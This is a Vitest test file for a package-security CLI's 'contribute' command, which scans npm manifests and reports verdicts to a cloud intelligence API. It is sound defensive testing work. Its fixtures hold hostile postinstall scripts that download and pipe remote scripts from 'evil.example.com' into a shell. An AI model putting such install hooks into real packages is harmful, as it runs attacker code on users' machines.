import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import * as fs from 'fs';
import * as os from 'os';
import * as path from 'path';
import { runContribute, analyzeManifest, toAlert, deriveState, deriveRisk, computeContentId, capAlerts, computeManifestHash } from './contribute';
import type { ContributeRunResult } from './contribute';
import { saveSession } from './cloud_client';
import type { Session } from './cloud_client';

function buildSession(token: string, overrides: Partial<Session> = {}): Session {
    return {
        token,
        user: 'octocat',
        subjectId: 'sub_123',
        plan: 'pro',
        planLabel: 'Pro',
        expiresAt: '2027-08-05T00:00:00.000Z',
        capabilities: {
            content_intel_lookup: true,
            remote_scan: true,
            oracle_integration: true,
            offline_sync: false,
            sbom: true,
            ai_review: false,
            contribute: true,
        },
        limits: { apiRequestsPerMonth: 10000, maxRepos: 25, retentionDays: 365 },
        fetchedAt: '2026-08-05T00:00:00.000Z',
        ...overrides,
    };
}

function makeTempDir(): string {
    return fs.mkdtempSync(path.join(os.tmpdir(), 'sentinel-contribute-'));
}

function outputText(result: ContributeRunResult): string {
    return result.lines.map((l) => l.text).join('\n');
}

function writeManifest(dir: string, manifest: unknown = {
    name: 'evil-pkg',
    version: '1.0.0',
    scripts: { postinstall: 'curl -s https://evil.example.com/payload.sh | sh' },
}): string {
    fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify(manifest, null, 2), 'utf8');
    return path.join(dir, 'package.json');
}

function contributeBody(overrides: Record<string, unknown> = {}): Record<string, unknown> {
    return {
        applied: true,
        contentId: `sha512:${'a'.repeat(128)}`,
        state: 'MALICIOUS',
        previousState: 'UNKNOWN',
        reason: null,
        scannerVersion: 'sentinel-cli-4.0.0',
        verified: false,
        ...overrides,
    };
}

function mockResponse(
    status: number,
    body: unknown,
    headers: Record<string, string> = {}
): void {
    const fetchMock = globalThis.fetch as ReturnType<typeof vi.fn>;
    const normalized: Record<string, string> = {};
    for (const [name, value] of Object.entries(headers)) {
        normalized[name.toLowerCase()] = value;
    }
    fetchMock.mockResolvedValue({
        ok: status >= 200 && status < 300,
        status,
        headers: {
            get: (name: string) => normalized[name.toLowerCase()] ?? null,
        },
        json: () => Promise.resolve(body),
    });
}

describe('sentinel contribute command (runContribute)', () => {
    let fetchMock: ReturnType<typeof vi.fn>;

    beforeEach(() => {
        fetchMock = vi.fn();
        vi.stubGlobal('fetch', fetchMock);
    });

    afterEach(() => {
        vi.unstubAllGlobals();
    });

    it('Given a valid manifest with a malicious postinstall when I run contribute then it exits 0 and prints State and Verified: false', async () => {
        const dir = makeTempDir();
        try {
            saveSession(buildSession('tok-1'), { sessionDir: dir });
            writeManifest(dir);
            mockResponse(200, contributeBody());
            const result = await runContribute(
                { targetPath: dir, api: 'https://cloud.example.com' },
                { sessionDir: dir }
            );
            expect(result.exitCode).toBe(0);
            const text = outputText(result);
            expect(text).toContain('Contribution recorded');
            expect(text).toContain('State: MALICIOUS (was UNKNOWN)');
            expect(text).toContain('Verified: false');
            expect(text).toContain(`Content: sha512:${'a'.repeat(17)}…`);
            const [url, init] = fetchMock.mock.calls[0];
            expect(url).toBe('https://cloud.example.com/api/intelligence/contribute');
            const sentBody = JSON.parse((init as { body: string }).body);
            expect(sentBody.manifest).toContain('evil-pkg');
            expect(sentBody.state).toBe('MALICIOUS');
            expect(sentBody.scannerVersion).toBe('sentinel-cli-4.0.0');
            expect(sentBody.contentId).toMatch(/^sha512:[0-9a-f]{128}$/);
            expect(sentBody.evidence.risk).toBe('critical');
            expect(sentBody.evidence.manifestHash).toMatch(/^[0-9a-f]{24}$/);
            expect(sentBody.evidence.deltas).toEqual([]);
            expect(sentBody.evidence.alerts.length).toBeGreaterThan(0);
        } finally {
            fs.rmSync(dir, { recursive: true, force: true });
        }
    });

    it('Given an applied=false result when I run contribute then it exits 0 and prints the reason', async () => {
        const dir = makeTempDir();
        try {
            saveSession(buildSession('tok-1'), { sessionDir: dir });
            writeManifest(dir);
            mockResponse(
                200,
                contributeBody({ applied: false, state: 'KNOWN_SAFE', reason: 'downgrade-rejected' })
            );
            const result = await runContribute(
                { targetPath: dir, api: 'https://cloud.example.com' },
                { sessionDir: dir }
            );
            expect(result.exitCode).toBe(0);
            const text = outputText(result);
            expect(text).toContain('Contribution not applied (reason: downgrade-rejected)');
            expect(text).toContain('Current Cloud state: KNOWN_SAFE.');
        } finally {
            fs.rmSync(dir, { recursive: true, force: true });
        }
    });

    it('Given a package.json file path (not a directory) when I run contribute then it still succeeds', async () => {
        const dir = makeTempDir();
        try {
            saveSession(buildSession('tok-1'), { sessionDir: dir });
            const manifestPath = writeManifest(dir);
            mockResponse(200, contributeBody());
            const result = await runContribute(
                { targetPath: manifestPath, api: 'https://cloud.example.com' },
                { sessionDir: dir }
            );
            expect(result.exitCode).toBe(0);
            expect(outputText(result)).toContain('Contribution recorded');
        } finally {
            fs.rmSync(dir, { recursive: true, force: true });
        }
    });

    it('Given an accepted contribution when I run contribute --json then it prints the full raw result as JSON', async () => {
        const dir = makeTempDir();
        try {
            saveSession(buildSession('tok-1'), { sessionDir: dir });
            writeManifest(dir);
            mockResponse(200, contributeBody());
            const result = await runContribute(
                { targetPath: dir, api: 'https://cloud.example.com', json: true },
                { sessionDir: dir }
            );
            expect(result.exitCode).toBe(0);
            const parsed = JSON.parse(outputText(result));
            expect(parsed.applied).toBe(true);
            expect(parsed.state).toBe('MALICIOUS');
            expect(parsed.verified).toBe(false);
            expect(parsed.contentId).toBe(`sha512:${'a'.repeat(128)}`);
        } finally {
            fs.rmSync(dir, { recursive: true, force: true });
        }
    });

    it('Given no session when I run contribute then it exits 1 and prints "No active session"', async () => {
        const dir = makeTempDir();
        try {
            writeManifest(dir);
            const result = await runContribute(
                { targetPath: dir, api: 'https://cloud.example.com' },
                { sessionDir: dir }
            );
            expect(result.exitCode).toBe(1);
            expect(outputText(result)).toContain("No active session. Run 'sentinel login' first.");
            expect(fetchMock).not.toHaveBeenCalled();
        } finally {
            fs.rmSync(dir, { recursive: true, force: true });
        }
    });

    it('Given a plan without contribute when I run contribute then it exits 1 with the plan message and does NOT call the server', async () => {
        const dir = makeTempDir();
        try {
            const session = buildSession('tok-1');
            saveSession(
                buildSession('tok-1', {
                    capabilities: { ...session.capabilities, contribute: false },
                }),
                { sessionDir: dir }
            );
            writeManifest(dir);
            const result = await runContribute(
                { targetPath: dir, api: 'https://cloud.example.com' },
                { sessionDir: dir }
            );
            expect(result.exitCode).toBe(1);
            expect(outputText(result)).toContain(
                'Your plan does not include intelligence contribution.'
            );
            expect(fetchMock).not.toHaveBeenCalled();
        } finally {
            fs.rmSync(dir, { recursive: true, force: true });
        }
    });

    it('Given a session without the contribute field when I run contribute then it exits 1 with the plan message', async () => {
        const dir = makeTempDir();
        try {
            const session = buildSession('tok-1');
            const capabilities = { ...session.capabilities };
            delete capabilities.contribute;
            saveSession(buildSession('tok-1', { capabilities }), { sessionDir: dir });
            writeManifest(dir);
            const result = await runContribute(
                { targetPath: dir, api: 'https://cloud.example.com' },
                { sessionDir: dir }
            );
            expect(result.exitCode).toBe(1);
            expect(outputText(result)).toContain(
                'Your plan does not include intelligence contribution.'
            );
            expect(fetchMock).not.toHaveBeenCalled();
        } finally {
            fs.rmSync(dir, { recursive: true, force: true });
        }
    });

    it('Given an invalid token when I run contribute then the session file is removed and it exits 1', async () => {
        const dir = makeTempDir();
        try {
            const sessionPath = path.join(dir, 'auth.json');
            saveSession(buildSession('tok-1'), { sessionDir: dir });
            writeManifest(dir);
            expect(fs.existsSync(sessionPath)).toBe(true);
            mockResponse(401, { error: 'Invalid or expired API token.' });
            const result = await runContribute(
                { targetPath: dir, api: 'https://cloud.example.com' },
                { sessionDir: dir }
            );
            expect(result.exitCode).toBe(1);
            expect(outputText(result)).toContain("Session expired. Run 'sentinel login'.");
            expect(fs.existsSync(sessionPath)).toBe(false);
        } finally {
            fs.rmSync(dir, { recursive: true, force: true });
        }
    });

    it('Given the Cloud rejects with 429 when I run contribute then it exits 1 and shows the quota message, server error and retry-after', async () => {
        const dir = makeTempDir();
        try {
            saveSession(buildSession('tok-1'), { sessionDir: dir });
            writeManifest(dir);
            mockResponse(429, { error: 'Rate limit exceeded. Retry shortly.' }, { 'Retry-After': '60' });
            const result = await runContribute(
                { targetPath: dir, api: 'https://cloud.example.com' },
                { sessionDir: dir }
            );
            expect(result.exitCode).toBe(1);
            const text = outputText(result);
            expect(text).toContain('Cloud limit reached (quota or rate).');
            expect(text).toContain('Rate limit exceeded. Retry shortly.');
            expect(text).toContain('Retry in 60s.');
        } finally {
            fs.rmSync(dir, { recursive: true, force: true });
        }
    });

    it('Given the Cloud rejects with 429 and no Retry-After when I run contribute then it still exits 1 with a usable message', async () => {
        const dir = makeTempDir();
        try {
            saveSession(buildSession('tok-1'), { sessionDir: dir });
            writeManifest(dir);
            mockResponse(429, { error: 'Monthly API quota exhausted.' });
            const result = await runContribute(
                { targetPath: dir, api: 'https://cloud.example.com' },
                { sessionDir: dir }
            );
            expect(result.exitCode).toBe(1);
            const text = outputText(result);
            expect(text).toContain('Cloud limit reached (quota or rate).');
            expect(text).toContain('Monthly API quota exhausted.');
        } finally {
            fs.rmSync(dir, { recursive: true, force: true });
        }
    });

    it('Given the Cloud has content intelligence disabled (503) when I run contribute then it exits 1 with the disabled message', async () => {
        const dir = makeTempDir();
        try {
            saveSession(buildSession('tok-1'), { sessionDir: dir });
            writeManifest(dir);
            mockResponse(503, { error: 'Content-intel is disabled on this server.' });
            const result = await runContribute(
                { targetPath: dir, api: 'https://cloud.example.com' },
                { sessionDir: dir }
            );
            expect(result.exitCode).toBe(1);
            expect(outputText(result)).toContain(
                'Content intelligence is disabled on the Cloud.'
            );
        } finally {
            fs.rmSync(dir, { recursive: true, force: true });
        }
    });

    it('Given the Cloud rejects with 403 when I run contribute then it exits 1 with the plan message and preserves the session', async () => {
        const dir = makeTempDir();
        try {
            const sessionPath = path.join(dir, 'auth.json');
            saveSession(buildSession('tok-1'), { sessionDir: dir });
            writeManifest(dir);
            mockResponse(403, { error: 'Your plan does not include intelligence contribution.' });
            const result = await runContribute(
                { targetPath: dir, api: 'https://cloud.example.com' },
                { sessionDir: dir }
            );
            expect(result.exitCode).toBe(1);
            expect(outputText(result)).toContain(
                'Your plan does not include intelligence contribution.'
            );
            expect(fs.existsSync(sessionPath)).toBe(true);
        } finally {
            fs.rmSync(dir, { recursive: true, force: true });
        }
    });

    it('Given the Cloud rejects with 400 when I run contribute then it exits 1 with the rejected message', async () => {
        const dir = makeTempDir();
        try {
            saveSession(buildSession('tok-1'), { sessionDir: dir });
            writeManifest(dir);
            mockResponse(400, { error: 'Evidence schema mismatch.' });
            const result = await runContribute(
                { targetPath: dir, api: 'https://cloud.example.com' },
                { sessionDir: dir }
            );
            expect(result.exitCode).toBe(1);
            expect(outputText(result)).toContain('Contribution rejected: Evidence schema mismatch.');
        } finally {
            fs.rmSync(dir, { recursive: true, force: true });
        }
    });

    it('Given applied=false with reason "verified-record" when I run contribute then it exits 0 and renders the verified-record reason', async () => {
        const dir = makeTempDir();
        try {
            saveSession(buildSession('tok-1'), { sessionDir: dir });
            writeManifest(dir);
            mockResponse(
                200,
                contributeBody({
                    applied: false,
                    state: 'MALICIOUS',
                    previousState: 'MALICIOUS',
                    reason: 'verified-record',
                })
            );
            const result = await runContribute(
                { targetPath: dir, api: 'https://cloud.example.com' },
                { sessionDir: dir }
            );
            expect(result.exitCode).toBe(0);
            const text = outputText(result);
            expect(text).toContain('Contribution not applied (reason: verified-record)');
            expect(text).toContain('Current Cloud state: MALICIOUS.');
        } finally {
            fs.rmSync(dir, { recursive: true, force: true });
        }
    });

    it('Given the Cloud rejects with 413 (too large) when I run contribute then it exits 1 with the rejected message', async () => {
        const dir = makeTempDir();
        try {
            saveSession(buildSession('tok-1'), { sessionDir: dir });
            writeManifest(dir);
            mockResponse(413, { error: 'Manifest exceeds size limit.' });
            const result = await runContribute(
                { targetPath: dir, api: 'https://cloud.example.com' },
                { sessionDir: dir }
            );
            expect(result.exitCode).toBe(1);
            expect(outputText(result)).toContain(
                'Contribution rejected: Manifest exceeds size limit.'
            );
        } finally {
            fs.rmSync(dir, { recursive: true, force: true });
        }
    });

    it('Given a manifest producing more than 100 findings when I run contribute then the payload only carries 100 alerts', async () => {
        const dir = makeTempDir();
        try {
            saveSession(buildSession('tok-1'), { sessionDir: dir });
            writeManifest(dir, {
                name: 'big-pkg',
                version: '1.0.0',
                scripts: Object.fromEntries(
                    Array.from({ length: 60 }, (_, i) => [
                        `s${i}`,
                        'curl -s http://evil.example.com/p.sh | bash && base64 -d',
                    ])
                ),
            });
            mockResponse(200, contributeBody());
            const result = await runContribute(
                { targetPath: dir, api: 'https://cloud.example.com' },
                { sessionDir: dir }
            );
            expect(result.exitCode).toBe(0);
            const sentBody = JSON.parse((fetchMock.mock.calls[0][1] as { body: string }).body);
            expect(sentBody.evidence.alerts.length).toBe(100);
            expect(sentBody.state).toBe('MALICIOUS');
            expect(sentBody.evidence.alerts.some((a: { severity: string }) => a.severity === 'CRITICAL')).toBe(true);
        } finally {
            fs.rmSync(dir, { recursive: true, force: true });
        }
    });

    it('Given the Cloud is offline when I run contribute then it falls back to local analysis and exits 0', async () => {
        const dir = makeTempDir();
        try {
            const sessionPath = path.join(dir, 'auth.json');
            saveSession(buildSession('tok-1'), { sessionDir: dir });
            writeManifest(dir);
            fetchMock.mockRejectedValue(new Error('fetch failed: ECONNREFUSED'));
            const result = await runContribute(
                { targetPath: dir, api: 'https://cloud.example.com' },
                { sessionDir: dir }
            );
            expect(result.exitCode).toBe(0);
            expect(outputText(result)).toContain(
                'Cloud unavailable — continuing with local analysis.'
            );
            expect(fs.existsSync(sessionPath)).toBe(true);
        } finally {
            fs.rmSync(dir, { recursive: true, force: true });
        }
    });

    it('Given the Cloud returns a 5xx when I run contribute then it falls back to local analysis and exits 0', async () => {
        const dir = makeTempDir();
        try {
            saveSession(buildSession('tok-1'), { sessionDir: dir });
            writeManifest(dir);
            mockResponse(500, { error: 'boom' });
            const result = await runContribute(
                { targetPath: dir, api: 'https://cloud.example.com' },
                { sessionDir: dir }
            );
            expect(result.exitCode).toBe(0);
            expect(outputText(result)).toContain(
                'Cloud unavailable — continuing with local analysis.'
            );
        } finally {
            fs.rmSync(dir, { recursive: true, force: true });
        }
    });

    it('Given a malformed 200 response when I run contribute then it does not trust the result and exits 0 with the fallback message', async () => {
        const dir = makeTempDir();
        try {
            saveSession(buildSession('tok-1'), { sessionDir: dir });
            writeManifest(dir);
            mockResponse(200, { applied: true, contentId: `sha512:${'a'.repeat(128)}`, state: 'MALICIOUS' });
            const result = await runContribute(
                { targetPath: dir, api: 'https://cloud.example.com' },
                { sessionDir: dir }
            );
            expect(result.exitCode).toBe(0);
            const text = outputText(result);
            expect(text).toContain('Cloud unavailable');
            expect(text).not.toContain('Contribution recorded');
        } finally {
            fs.rmSync(dir, { recursive: true, force: true });
        }
    });

    it('Given a manifest larger than 256KB when I run contribute then it exits 1 with the size message', async () => {
        const dir = makeTempDir();
        try {
            saveSession(buildSession('tok-1'), { sessionDir: dir });
            fs.writeFileSync(
                path.join(dir, 'package.json'),
                '{"big":"' + 'x'.repeat(262200) + '"}',
                'utf8'
            );
            const result = await runContribute(
                { targetPath: dir, api: 'https://cloud.example.com' },
                { sessionDir: dir }
            );
            expect(result.exitCode).toBe(1);
            expect(outputText(result)).toContain('Manifest too large (max 256KB).');
            expect(fetchMock).not.toHaveBeenCalled();
        } finally {
            fs.rmSync(dir, { recursive: true, force: true });
        }
    });

    it('Given a directory without package.json when I run contribute then it exits 1 with the not-found message', async () => {
        const dir = makeTempDir();
        try {
            saveSession(buildSession('tok-1'), { sessionDir: dir });
            const result = await runContribute(
                { targetPath: dir, api: 'https://cloud.example.com' },
                { sessionDir: dir }
            );
            expect(result.exitCode).toBe(1);
            expect(outputText(result)).toContain(`No package.json found at '${dir}'.`);
            expect(fetchMock).not.toHaveBeenCalled();
        } finally {
            fs.rmSync(dir, { recursive: true, force: true });
        }
    });

    it('Given an unsupported format when I run contribute then it exits 1 before any fetch', async () => {
        const dir = makeTempDir();
        try {
            saveSession(buildSession('tok-1'), { sessionDir: dir });
            writeManifest(dir);
            const result = await runContribute(
                { targetPath: dir, api: 'https://cloud.example.com', format: 'yarn' },
                { sessionDir: dir }
            );
            expect(result.exitCode).toBe(1);
            expect(outputText(result)).toContain(
                "Unsupported format 'yarn'. Supported: ['npm']."
            );
            expect(fetchMock).not.toHaveBeenCalled();
        } finally {
            fs.rmSync(dir, { recursive: true, force: true });
        }
    });

    it('Given no SENTINEL_CLOUD_URL and no --api when I run contribute then it exits 1 with the base URL message', async () => {
        const dir = makeTempDir();
        try {
            saveSession(buildSession('tok-1'), { sessionDir: dir });
            writeManifest(dir);
            const result = await runContribute(
                { targetPath: dir },
                { sessionDir: dir, env: {} }
            );
            expect(result.exitCode).toBe(1);
            expect(outputText(result)).toContain('Set SENTINEL_CLOUD_URL or pass --api <url>.');
            expect(fetchMock).not.toHaveBeenCalled();
        } finally {
            fs.rmSync(dir, { recursive: true, force: true });
        }
    });
});

describe('contribute state and risk derivation', () => {
    it('maps a malicious postinstall fixture to state MALICIOUS and risk critical', () => {
        const alerts = analyzeManifest(
            JSON.stringify({
                name: 'evil-pkg',
                version: '1.0.0',
                scripts: { postinstall: 'curl -s https://evil.example.com/payload.sh | sh' },
            })
        ).map(toAlert);
        expect(alerts.some((a: { severity: string }) => a.severity === 'CRITICAL')).toBe(true);
        expect(deriveState(alerts)).toBe('MALICIOUS');
        expect(deriveRisk(alerts)).toBe('critical');
    });

    it('maps a benign fixture to state KNOWN_SAFE and risk low', () => {
        const alerts = analyzeManifest(
            JSON.stringify({ name: 'pkg', version: '1.0.0' })
        ).map(toAlert);
        expect(alerts).toEqual([]);
        expect(deriveState(alerts)).toBe('KNOWN_SAFE');
        expect(deriveRisk(alerts)).toBe('low');
    });

    it('derives SUSPICIOUS/medium from MEDIUM and WARNING alerts only', () => {
        expect(deriveState([{ severity: 'WARNING', type: 'X', riskLevel: 3, message: 'x' }])).toBe(
            'SUSPICIOUS'
        );
        expect(deriveRisk([{ severity: 'MEDIUM', type: 'X', riskLevel: 5, message: 'x' }])).toBe(
            'medium'
        );
    });

    it('produces a sha512:<128 lowercase hex> contentId', () => {
        const contentId = computeContentId(Buffer.from('{"name":"pkg"}', 'utf8'));
        expect(contentId).toMatch(/^sha512:[0-9a-f]{128}$/);
    });

    it('capAlerts keeps at most 100 alerts and preserves the most severe ones so state/risk stay consistent', () => {
        const manifest = {
            name: 'big-pkg',
            version: '1.0.0',
            scripts: Object.fromEntries(
                Array.from({ length: 60 }, (_, i) => [
                    `s${i}`,
                    'curl -s http://evil.example.com/p.sh | bash && base64 -d',
                ])
            ),
        };
        const all = analyzeManifest(JSON.stringify(manifest, null, 2)).map(toAlert);
        expect(all.length).toBeGreaterThan(100);
        const capped = capAlerts(all);
        expect(capped.length).toBe(100);
        expect(deriveState(capped)).toBe(deriveState(all));
        expect(deriveRisk(capped)).toBe(deriveRisk(all));
        expect(capped).toEqual(
            expect.arrayContaining(all.filter((a) => a.severity === 'CRITICAL'))
        );
        expect(computeManifestHash(capped)).toMatch(/^[0-9a-f]{24}$/);
        expect(capAlerts(all)).not.toBe(all);
    });

    it('capAlerts returns arrays at or below the limit unchanged', () => {
        const alerts = [{ severity: 'WARNING', type: 'X', riskLevel: 3, message: 'x' }];
        expect(capAlerts(alerts)).toBe(alerts);
    });
});
